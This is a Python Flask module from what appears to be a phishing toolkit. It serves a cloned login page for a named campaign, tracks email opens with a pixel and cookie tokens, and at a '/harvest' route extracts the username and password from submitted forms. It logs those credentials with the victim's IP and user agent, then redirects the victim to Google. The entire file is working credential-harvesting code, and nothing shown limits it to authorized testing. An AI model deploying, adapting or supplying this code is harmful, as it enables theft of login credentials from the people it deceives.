import os
import csv
import uuid
from datetime import datetime
from flask import Flask, request, redirect, send_from_directory, make_response
from modules.utils import log_event, color
from modules.tracker import log_credential, log_event_db

BASE_DIR   = os.path.join(os.path.dirname(__file__), "..", "data", "cloned_pages")
LOGS_DIR   = os.path.join(os.path.dirname(__file__), "..", "data", "logs")
REDIRECT_URL = "https://www.google.com"  # Where victim lands after submission


def start_listener(campaign: str, port: int = 8080):
    page_dir = os.path.join(BASE_DIR, campaign)
    if not os.path.exists(page_dir):
        print(color(f"[-] No cloned page found for campaign '{campaign}'. Run clone first.", "red"))
        return

    app = Flask(__name__, static_folder=None)
    app.config["campaign"] = campaign

    # ── Serve cloned page ──────────────────────────────────────────────────────
    @app.route("/")
    def index():
        token = request.args.get("t", str(uuid.uuid4())[:8])
        log_event_db(campaign, token, "visited")
        log_event(campaign, "EVENT", f"Token: {token} | Action: page_visited | IP: {request.remote_addr}")
        resp = make_response(open(os.path.join(page_dir, "index.html")).read())
        resp.set_cookie("_t", token)
        return resp

    # ── Serve local assets ─────────────────────────────────────────────────────
    @app.route("/assets/<path:filename>")
    def assets(filename):
        return send_from_directory(os.path.join(page_dir, "assets"), filename)

    # ── Tracking pixel ─────────────────────────────────────────────────────────
    @app.route("/track/open")
    def track_open():
        token = request.cookies.get("_t", "unknown")
        log_event_db(campaign, token, "email_opened")
        log_event(campaign, "EVENT", f"Token: {token} | Action: email_opened | IP: {request.remote_addr}")
        # Return 1x1 transparent GIF
        pixel = (
            b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00"
            b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00"
            b"\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
            b"\x44\x01\x00\x3b"
        )
        return app.response_class(pixel, mimetype="image/gif")

    # ── Credential harvest ─────────────────────────────────────────────────────
    @app.route("/harvest", methods=["POST"])
    def harvest():
        token    = request.cookies.get("_t", request.form.get("_campaign", "unknown"))
        ip       = request.remote_addr
        ua       = request.headers.get("User-Agent", "")
        data     = {k: v for k, v in request.form.items() if k != "_campaign"}

        # Pull likely username/password fields
        username = _extract_field(data, ["email", "username", "user", "login", "mail"])
        password = _extract_field(data, ["password", "pass", "pwd", "passwd"])

        log_credential(campaign, token, ip, ua, username, password, data)
        log_event(
            campaign, "HIT",
            f"IP: {ip} | User: {username} | Pass: {password} | Token: {token}"
        )
        log_event_db(campaign, token, "credentials_submitted")

        return redirect(REDIRECT_URL)

    # ── Start server ───────────────────────────────────────────────────────────
    print(color(f"\n[*] Harvester listening on http://0.0.0.0:{port}", "cyan"))
    print(color(f"[*] Campaign: {campaign}", "cyan"))
    print(color("[*] Press CTRL+C to stop\n", "yellow"))
    app.run(host="0.0.0.0", port=port, debug=False)


def _extract_field(data: dict, candidates: list) -> str:
    """Try common field name variations to find username or password."""
    for key in candidates:
        for k, v in data.items():
            if key in k.lower():
                return v
    return list(data.values())[0] if data else "unknown"
